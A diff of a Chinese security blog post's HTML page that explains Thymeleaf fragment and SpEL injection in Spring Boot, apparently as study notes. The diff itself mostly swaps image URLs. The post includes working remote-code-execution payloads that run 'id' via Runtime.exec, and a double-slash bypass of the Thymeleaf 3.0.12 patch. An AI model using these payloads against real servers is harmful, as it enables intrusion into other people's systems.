@@ -27,22 +27,22 @@
 <meta property="og:site_name" content="blueSatchel&#39;s blog">
 <meta property="og:description" content="thymeleaf fragment注入学习与springBoot整合步骤1.导入依赖,版本可以不写,由springBoot统一管理">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20221104235220749.png">
-<meta property="og:image" content="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20221104235352336.png">
-<meta property="og:image" content="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20221104235458060.png">
-<meta property="og:image" content="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20221104235637768.png">
-<meta property="og:image" content="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20221105005907494.png">
-<meta property="og:image" content="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20221105180720931.png">
-<meta property="og:image" content="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20221105182319525.png">
-<meta property="og:image" content="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20221105182858029.png">
-<meta property="og:image" content="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20221105183035030.png">
-<meta property="og:image" content="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20221105185826610.png">
+<meta property="og:image" content="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20221104235220749.png">
+<meta property="og:image" content="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20221104235352336.png">
+<meta property="og:image" content="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20221104235458060.png">
+<meta property="og:image" content="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20221104235637768.png">
+<meta property="og:image" content="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20221105005907494.png">
+<meta property="og:image" content="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20221105180720931.png">
+<meta property="og:image" content="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20221105182319525.png">
+<meta property="og:image" content="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20221105182858029.png">
+<meta property="og:image" content="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20221105183035030.png">
+<meta property="og:image" content="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20221105185826610.png">
 <meta property="article:published_time" content="2022-12-16T00:25:21.000Z">
-<meta property="article:modified_time" content="2022-12-16T00:26:59.741Z">
+<meta property="article:modified_time" content="2024-09-28T14:07:42.688Z">
 <meta property="article:author" content="blueSatchel">
 <meta property="article:tag" content="-- java -- thymeleaf">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20221104235220749.png">
+<meta name="twitter:image" content="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20221104235220749.png">
 
 <link rel="canonical" href="http://example.com/2022/12/16/thymeleaf%E7%AE%80%E5%8D%95%E5%85%A5%E9%97%A8/">
 
@@ -225,10 +225,16 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
-              
 
-              <time title="创建时间：2022-12-16 08:25:21 / 修改时间：08:26:59" itemprop="dateCreated datePublished" datetime="2022-12-16T08:25:21+08:00">2022-12-16</time>
+              <time title="创建时间：2022-12-16 08:25:21" itemprop="dateCreated datePublished" datetime="2022-12-16T08:25:21+08:00">2022-12-16</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2024-09-28 22:07:42" itemprop="dateModified" datetime="2024-09-28T22:07:42+08:00">2024-09-28</time>
+              </span>
 
           
             <span id="/2022/12/16/thymeleaf%E7%AE%80%E5%8D%95%E5%85%A5%E9%97%A8/" class="post-meta-item leancloud_visitors" data-flag-title="thymeleaf简单入门" title="阅读次数">
@@ -271,17 +277,17 @@
       
         <h2 id="thymeleaf-fragment注入学习"><a href="#thymeleaf-fragment注入学习" class="headerlink" title="thymeleaf fragment注入学习"></a>thymeleaf fragment注入学习</h2><h3 id="与springBoot整合"><a href="#与springBoot整合" class="headerlink" title="与springBoot整合"></a>与springBoot整合</h3><h3 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h3><h5 id="1-导入依赖-版本可以不写-由springBoot统一管理"><a href="#1-导入依赖-版本可以不写-由springBoot统一管理" class="headerlink" title="1.导入依赖,版本可以不写,由springBoot统一管理"></a>1.导入依赖,版本可以不写,由springBoot统一管理</h5><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-thymeleaf<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
-<h5 id="2-在resources文件夹下面创建templates文件夹-一般所有模板均放在此文件夹下面"><a href="#2-在resources文件夹下面创建templates文件夹-一般所有模板均放在此文件夹下面" class="headerlink" title="2.在resources文件夹下面创建templates文件夹,一般所有模板均放在此文件夹下面"></a>2.在resources文件夹下面创建templates文件夹,一般所有模板均放在此文件夹下面</h5><p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20221104235220749.png" alt="image-20221104235220749"></p>
-<h5 id="3-配置模板文件路径的前后缀"><a href="#3-配置模板文件路径的前后缀" class="headerlink" title="3.配置模板文件路径的前后缀"></a>3.配置模板文件路径的前后缀</h5><p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20221104235352336.png" alt="image-20221104235352336"></p>
-<h5 id="4-配置打包后的静态资源存放路径-一般不需要写"><a href="#4-配置打包后的静态资源存放路径-一般不需要写" class="headerlink" title="4.配置打包后的静态资源存放路径,一般不需要写"></a>4.配置打包后的静态资源存放路径,一般不需要写</h5><p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20221104235458060.png" alt="image-20221104235458060"></p>
-<h5 id="5-编写代码"><a href="#5-编写代码" class="headerlink" title="5.编写代码"></a>5.编写代码</h5><p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20221104235637768.png" alt="image-20221104235637768"></p>
+<h5 id="2-在resources文件夹下面创建templates文件夹-一般所有模板均放在此文件夹下面"><a href="#2-在resources文件夹下面创建templates文件夹-一般所有模板均放在此文件夹下面" class="headerlink" title="2.在resources文件夹下面创建templates文件夹,一般所有模板均放在此文件夹下面"></a>2.在resources文件夹下面创建templates文件夹,一般所有模板均放在此文件夹下面</h5><p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20221104235220749.png" alt="image-20221104235220749"></p>
+<h5 id="3-配置模板文件路径的前后缀"><a href="#3-配置模板文件路径的前后缀" class="headerlink" title="3.配置模板文件路径的前后缀"></a>3.配置模板文件路径的前后缀</h5><p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20221104235352336.png" alt="image-20221104235352336"></p>
+<h5 id="4-配置打包后的静态资源存放路径-一般不需要写"><a href="#4-配置打包后的静态资源存放路径-一般不需要写" class="headerlink" title="4.配置打包后的静态资源存放路径,一般不需要写"></a>4.配置打包后的静态资源存放路径,一般不需要写</h5><p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20221104235458060.png" alt="image-20221104235458060"></p>
+<h5 id="5-编写代码"><a href="#5-编写代码" class="headerlink" title="5.编写代码"></a>5.编写代码</h5><p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20221104235637768.png" alt="image-20221104235637768"></p>
 <p>访问/index即可</p>
 <h4 id="注入原理"><a href="#注入原理" class="headerlink" title="注入原理"></a>注入原理</h4><p>该漏洞有版本限制,目前在springBoot2.2.0.RELEASE版本可以执行</p>
 <p><a target="_blank" rel="noopener" href="https://github.com/veracode-research/spring-view-manipulation/">原理文章</a></p>
 <p>before loading the template from the filesystem, <a target="_blank" rel="noopener" href="https://github.com/thymeleaf/thymeleaf-spring/blob/74c4203bd5a2935ef5e571791c7f286e628b6c31/thymeleaf-spring3/src/main/java/org/thymeleaf/spring3/view/ThymeleafView.java">Spring ThymeleafView</a> class parses the template name as an expression:</p>
 <p>thymeleaf的fragment 功能会将::后面的字符串当成表达式解析</p>
 <p>fragement功能实现效果类似于vue动态路由传递一个参数过去让其选择性显示某一个div</p>
-<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20221105005907494.png" alt="image-20221105005907494"></p>
+<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20221105005907494.png" alt="image-20221105005907494"></p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">   <span class="comment">// By parsing it as a standard expression, we might profit from the expression cache</span></span><br><span class="line">   fragmentExpression = (FragmentExpression) parser.parseExpression(context, <span class="string">&quot;~&#123;&quot;</span> + viewTemplateName + <span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <h5 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__$&#123;<span class="keyword">new</span> java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(<span class="string">&quot;id&quot;</span>).getInputStream()).next()&#125;__::.x</span><br></pre></td></tr></table></figure>
@@ -289,13 +295,13 @@
 
 
 <h4 id="原理简单跟进"><a href="#原理简单跟进" class="headerlink" title="原理简单跟进"></a>原理简单跟进</h4><p>spel表达式则需要再额外学习一下,这里先跟着研究一下Payload的简单构造原理</p>
-<h4 id=""><a href="#" class="headerlink" title=""></a><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20221105180720931.png" alt="image-20221105180720931"></h4><p>上面这段表明只有当模板名称包含::的时候,才能进入到parseExpression</p>
+<h4 id=""><a href="#" class="headerlink" title=""></a><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20221105180720931.png" alt="image-20221105180720931"></h4><p>上面这段表明只有当模板名称包含::的时候,才能进入到parseExpression</p>
 <p>打断点跟进,发现在这个方法中会执行</p>
-<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20221105182319525.png" alt="image-20221105182319525"></p>
+<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20221105182319525.png" alt="image-20221105182319525"></p>
 <p>在这里通过正则匹配到__  __包裹的内容</p>
-<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20221105182858029.png" alt="image-20221105182858029"></p>
+<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20221105182858029.png" alt="image-20221105182858029"></p>
 <p>最后执行的时候会被还原成一个标准的spel表达式</p>
-<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20221105183035030.png" alt="image-20221105183035030"></p>
+<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20221105183035030.png" alt="image-20221105183035030"></p>
 <p><strong>以上逻辑仅限于Thymeleaf 3.0-3.0.12(不含3.0.12)</strong>     </p>
 <h2 id="Thymeleaf-3-0-12"><a href="#Thymeleaf-3-0-12" class="headerlink" title="Thymeleaf 3.0.12"></a>Thymeleaf 3.0.12</h2><p>在3.0.12版本发布了一个补丁</p>
 <p>其新增了一个这样的函数,当调用表达式的时候，会经过该函数的判断</p>
@@ -307,7 +313,7 @@
 <h5 id="payload-1"><a href="#payload-1" class="headerlink" title="payload"></a>payload</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">home/__$&#123;new java.util.Scanner(T (java.lang.Runtime).getRuntime().exec(&quot;id&quot;).getInputStream()).next()&#125;__::.x</span><br></pre></td></tr></table></figure>
 
 <h4 id="当视图名与当前path一致的时候"><a href="#当视图名与当前path一致的时候" class="headerlink" title="当视图名与当前path一致的时候"></a>当视图名与当前path一致的时候</h4><p>就是类似这样</p>
-<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20221105185826610.png" alt="image-20221105185826610"></p>
+<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20221105185826610.png" alt="image-20221105185826610"></p>
 <p>那么就会经过<code>SpringRequestUtils.java</code>中的<code>checkViewNameNotInRequest</code>函数检测</p>
 <h5 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h5><h6 id="1-两个"><a href="#1-两个" class="headerlink" title="1.两个/"></a>1.两个/</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user//__$&#123;new java.util.Scanner(T (java.lang.Runtime).getRuntime().exec(&quot;id&quot;).getInputStream()).next()&#125;__::.x</span><br></pre></td></tr></table></figure>
 
